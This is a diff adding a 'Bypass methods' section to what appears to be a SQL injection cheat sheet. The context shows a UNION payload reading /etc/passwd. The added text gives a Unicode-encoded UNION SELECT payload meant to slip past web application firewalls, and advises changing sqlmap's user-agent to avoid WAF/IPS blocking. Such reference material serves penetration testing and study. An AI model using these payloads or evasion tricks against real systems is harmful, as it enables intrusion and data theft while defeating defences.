@@ -126,3 +126,36 @@ Quando encontramos uma falha de SQL Injection, também conseguimos gravar uma we
 ' or 1=1 union select 1, 2, LOAD_FILE('/etc/passwd'), 4, 5, 6; #
 ```
 
+
+## Bypass methods
+
+### Unicode
+
+Use Unicode to encode the payload (if the application is using JSON to encode data). The following example shows how it works: 
+
+```
+<?php
+
+$data = ["name" => "João", "age" => 20];
+
+print_r(json_encode($data));
+```
+
+The response will be:
+
+```
+$ php json.php
+
+{"name":"Jo\u00e3o","age":20}
+```
+
+We can encode our payload, for example, `' union select 1,2, database(), 4, 5, 6; #` to Unicode.
+
+```
+\u0027\u0020\u0075\u006e\u0069\u006f\u006e\u0020\u0073\u0065\u006c\u0065\u0063\u0074\u0020\u0031\u002c\u0032\u002c\u0020\u0064\u0061\u0074\u0061\u0062\u0061\u0073\u0065\u0028\u0029\u002c\u0020\u0034\u002c\u0020\u0035\u002c\u0020\u0036\u003b\u0020\u0023
+```
+
+Some WAFs may block when we use `union select` or something similar, so by using Unicode we can bypass that filter.
+### User-Agent
+
+When we use a tool like sqlmap, by default it uses its own user-agent. It's important to change this because there are WAF/IPS that block user-agent used by these tools.
